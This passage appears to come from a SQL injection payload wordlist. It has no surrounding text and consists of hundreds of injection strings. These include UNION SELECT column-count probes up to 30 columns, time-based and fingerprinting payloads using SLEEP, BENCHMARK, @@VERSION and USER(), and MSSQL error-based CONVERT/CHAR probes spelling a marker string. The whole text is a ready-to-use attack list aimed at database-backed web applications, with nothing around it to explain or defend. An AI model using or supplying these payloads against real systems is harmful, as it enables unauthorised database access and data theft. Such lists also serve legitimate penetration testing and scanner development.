1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 1#\n UNION ALL SELECT 1,2#\n UNION ALL SELECT 1,2,3#\n UNION ALL SELECT 1,2,3,4#\n UNION ALL SELECT 1,2,3,4,5#\n UNION ALL SELECT 1,2,3,4,5,6#\n UNION ALL SELECT 1,2,3,4,5,6,7#\n UNION ALL SELECT 1,2,3,4,5,6,7,8#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT 1-- \n UNION ALL SELECT 1,2-- \n UNION ALL SELECT 1,2,3-- \n UNION ALL SELECT 1,2,3,4-- \n UNION ALL SELECT 1,2,3,4,5-- \n UNION ALL SELECT 1,2,3,4,5,6-- \n UNION ALL SELECT 1,2,3,4,5,6,7-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION SELECT @@VERSION,SLEEP(5),3\n UNION SELECT @@VERSION,SLEEP(5),USER(),4\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3'&quot;#\n UNION SELECT @@VERSION,SLEEP(5),USER(),4#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT USER()-- \n UNION ALL SELECT SLEEP(5)-- \n UNION ALL SELECT USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT NULL-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \n UNION ALL SELECT NULL#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\n UNION ALL SELECT NULL \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\n AND 5650=CONVERT(INT,(UNION ALL 